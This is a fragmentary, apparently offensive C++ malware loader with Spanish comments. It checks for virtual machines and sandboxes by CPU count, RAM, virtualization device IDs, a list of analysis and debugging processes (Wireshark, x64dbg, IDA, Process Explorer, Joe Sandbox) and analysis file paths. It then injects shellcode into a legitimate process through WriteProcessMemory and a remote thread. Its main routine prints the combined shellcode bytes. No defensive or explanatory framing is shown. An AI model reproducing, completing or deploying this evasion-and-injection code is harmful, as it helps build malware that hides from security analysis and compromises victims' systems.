...
bool IsRunningInVM() {
    ...
    // Verificar número de procesadores (muchos sandboxes usan 1 CPU)
    if (si.dwNumberOfProcessors < 2) {
        return true;
    }
    
    // Verificar cantidad de RAM (menos de 2GB es sospechoso)
    ...
    const char* virtualDevices[] = {
        "VBOX", "VMWARE", "VIRTUAL", "QEMU", "XEN", "BOCHS"
    };
    ...
    if (hDevInfo != INVALID_HANDLE_VALUE) {
        ...
        for (DWORD i = 0; SetupDiEnumDeviceInfo(hDevInfo, i, &deviceInfoData); i++) {
            ...
            if (SetupDiGetDeviceRegistryPropertyA(hDevInfo, &deviceInfoData, SPDRP_HARDWAREID, NULL, 
                ...
                for (const char* device : virtualDevices) {
...
bool IsRunningInSandbox() {
    // Verificar tiempo de actividad del sistema (sandboxes a menudo reinician frecuentemente)
    ...
    const char* sandboxProcesses[] = {
        ...
        "vmwareuser.exe", "vboxservice.exe", "vboxtray.exe",
        "procexp.exe", "procexp64.exe", "wireshark.exe", "fiddler.exe",
        "httpdebuggerui.exe", "processhacker.exe", "sysinternals.exe",
        "dumpcap.exe", "idag.exe", "idaq.exe", "idaq64.exe", "ollydbg.exe",
        "x64dbg.exe", "windbg.exe", "joeboxserver.exe", "joeboxcontrol.exe"
    };
    ...
    if (snapshot != INVALID_HANDLE_VALUE) {
        ...
        if (Process32First(snapshot, &pe32)) {
            do {
                for (const char* process : sandboxProcesses) {
    ...
    const char* sandboxFiles[] = {
        "C:\\tools\\", "C:\\analysis\\", "C:\\sample.exe",
        "C:\\malware.exe", "C:\\virus.exe", "C:\\sandbox\\"
    };
...
// Función para inyectar en un proceso legítimo
        ...
        do {
            for (const char* target : targetProcesses) {
                if (_stricmp(processEntry.szExeFile, target) == 0) {
                    ...
                    // Escribir shellcode en el proceso remoto
                    if (!WriteProcessMemory(process, remoteMem, shellcode, size, NULL)) {
                    ...
                    WaitForSingleObject(thread, 5000); // Esperar máximo 5 segundos
...
int main() {
    ...
    // Imprimir primeros bytes del shellcode combinado para verificar
    std::cout << "Combined shellcode (first 32 bytes): ";
    for (int i = 0; i < 32 && i < shellcodeSize; i++){
